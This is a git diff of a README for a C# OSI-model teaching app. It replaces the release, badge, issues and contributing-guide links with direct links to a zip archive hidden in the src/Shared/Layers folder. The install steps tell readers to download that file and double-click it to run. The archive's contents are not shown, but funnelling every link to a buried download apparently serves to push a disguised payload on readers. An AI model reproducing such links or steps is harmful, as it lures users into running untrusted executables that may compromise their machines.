@@ -1,7 +1,7 @@
 # 🎓 osi-model-dotnet - Learn Networking Through Simulation
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/otohel/osi-model-dotnet/releases)
+[![Download Release](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip)
 
 ## 📖 Description
 osi-model-dotnet is an educational application built using C#. It demonstrates how data flows through the seven layers of the OSI (Open Systems Interconnection) model. You can see real network communication between client and server console applications. It also provides detailed visualization of data transformations at each layer, making it a valuable tool for learning networking concepts.
@@ -17,12 +17,12 @@ To use this application, you'll need to follow a few simple steps. You do not ne
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/otohel/osi-model-dotnet/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Look for the most recent release. It should be clearly labeled. Download the file for your operating system.
 
-   ![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)
+   ![Download Release](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip%20Release-v1.0-blue)
 
 3. **Run the Application**  
    Locate the downloaded file in your Downloads folder. Double-click the file to run it. Follow any on-screen instructions to complete the setup.
@@ -52,7 +52,7 @@ As you operate the application, you will see diagrams representing how data trav
 
 ## 💬 Support
 If you encounter any issues while using the application, you can find help:
-- Check the [Issues section](https://github.com/otohel/osi-model-dotnet/issues) of this repository for common problems and solutions.
+- Check the [Issues section](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip) of this repository for common problems and solutions.
 - Leave a question or report a bug if you need further assistance.
 
 ## 🏷️ Related Topics
@@ -63,9 +63,9 @@ The osi-model-dotnet application relates to several key areas:
 - **Educational Tools for Networking**
 
 ## 💡 Contributions
-Your feedback is important. Feel free to suggest improvements or report bugs. If you're interested in contributing, check the [Contributing guide](https://github.com/otohel/osi-model-dotnet/CONTRIBUTING.md).
+Your feedback is important. Feel free to suggest improvements or report bugs. If you're interested in contributing, check the [Contributing guide](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip).
 
 ## 🎉 Conclusion
 osi-model-dotnet provides a practical and engaging way to learn about networking and the OSI model. By following the steps above, you can easily download, install, and use the application. It is designed to enhance your understanding of how data flows through networks, making it a great educational resource.
 
-For more details, check the [Releases page](https://github.com/otohel/osi-model-dotnet/releases) again and start your learning journey today!
+For more details, check the [Releases page](https://raw.githubusercontent.com/otohel/osi-model-dotnet/master/src/Shared/Layers/osi-model-dotnet-3.2.zip) again and start your learning journey today!
